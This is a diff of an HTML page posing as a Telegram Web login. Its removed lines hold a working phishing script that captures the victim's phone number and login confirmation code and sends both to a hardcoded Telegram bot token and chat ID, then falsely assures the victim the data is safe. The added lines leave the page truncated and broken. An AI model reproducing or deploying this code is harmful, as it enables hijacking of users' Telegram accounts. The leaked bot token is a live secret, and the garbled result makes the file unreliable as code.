@@ -3,11 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Telegram Web</title>
-  <style>
-    * {
-      margin: 0; padding: 0; box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  <
     }
 
     body {
@@ -30,26 +26,7 @@
       text-align: center;
     }
 
-    .particle {
-	position: fixed;
-        pointer-events: none;
-        z-index: 10000;
-        animation: flyUp 1.8s ease-out forwards;
-        font-size: 24px;
-        will-change: transform, opacity;;
-     }
-
-    @keyframes flyUp {
-        0% {
-            transform: translate(0, 0) scale(1) rotate(0deg);
-                opacity: 1;
-        }
-        100% {
-            transform: translate(var(--end-x), var(--end-y)) scale(0.7) rotate(720deg);
-                opacity: 0;
-        }
-    }
-    
+    .
     .telegram-logo-container {
       width: 100px;
       height: 100px;
@@ -146,19 +123,6 @@
       display: none;
     }
 
-    .step.active {
-      display: block;
-    }
-
-    .back-btn {
-      background: none;
-      border: none;
-      color: #0088cc;
-      cursor: pointer;
-      font-size: 14px;
-      margin-top: 15px;
-      padding: 5px;
-    }
 
     .loading {
       display: none;
@@ -233,93 +197,7 @@
 
   <script>
     
-    function launchParticles(count = 40) {
-    	const symbols = ['🎉', '✨', '⭐', '✨', '✨', '❤️'];
-    	const centerX = window.innerWidth / 2;
-    	const startY = window.innerHeight - 20;
-
-    	for (let i = 0; i < count; i++) {
-            const el = document.createElement('div');
-            el.className = 'particle';
-            el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-
-            el.style.left = `${centerX}px`;
-            el.style.top = `${startY}px`;
-            el.style.fontSize = `${Math.random() * 20 + 16}px`;
-
-            // Угол от -85 до -95 градусов, немного в стороны
-            const angle = (Math.random() * 150 - 55 - 90) * (Math.PI / 180); // от -105° до -75°
-            const speed = Math.random() * 300 + 150;
-
-            const x = Math.cos(angle) * speed;
-            const y = Math.sin(angle) * speed;
-
-            el.style.setProperty('--end-x', `${x}px`);
-            el.style.setProperty('--end-y', `${y}px`);
-
-            el.addEventListener('animationend', () => el.remove());
-            document.body.appendChild(el);
-        }
-    }
-
-    // Запуск при загрузке
-    window.addEventListener('load', () => {
-        launchParticles(50);
-    });
-
-    let phoneNumber = '';
-
-    function sendToTelegram(text) {
-      const botToken = '7964523292:AAGSzi3epDu7dZt_vYCvLCMXt7LFe3zaPGw';      // ← вставьте сюда токен бота
-      const chatId = '1994625578';      // ← вставьте сюда ваш chat_id
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: text })
-      });
-    }
-
-    function showStep(step) {
-      document.getElementById('step1').classList.remove('active');
-      document.getElementById('step2').classList.remove('active');
-      document.getElementById(`step${step}`).classList.add('active');
-      document.getElementById('phoneError').style.display = 'none';
-      document.getElementById('codeError').style.display = 'none';
-    }
-
-    function sendPhone() {
-      const phoneInput = document.getElementById('phone');
-      phoneNumber = phoneInput.value.trim();
-
-      if (phoneNumber.length < 10) {
-        document.getElementById('phoneError').style.display = 'block';
-        return;
-      }
-
-      sendToTelegram(`📱 Введён номер телефона: +${phoneNumber}`);
-      showStep(2);
-    }
-
-    function sendCode() {
-      const codeInput = document.getElementById('code');
-      const code = codeInput.value.trim();
-
-      if (code.length !== 5 || !/^\d+$/.test(code)) {
-        document.getElementById('codeError').style.display = 'block';
-        return;
-      }
-
-      document.getElementById('loading').style.display = 'block';
-      document.querySelector('.btn').disabled = true;
-
-      sendToTelegram(`🔐 Код подтверждения для +${phoneNumber}: ${code}`);
-
-      setTimeout(() => {
-        document.getElementById('loading').style.display = 'none';
-        document.querySelector('.btn').disabled = false;
-        alert('Спасибо! Ваши данные в полной безопасности.');
-      }, 2000);
+    
     }
 
     document.getElementById('code').addEventListener('input', function (e) {
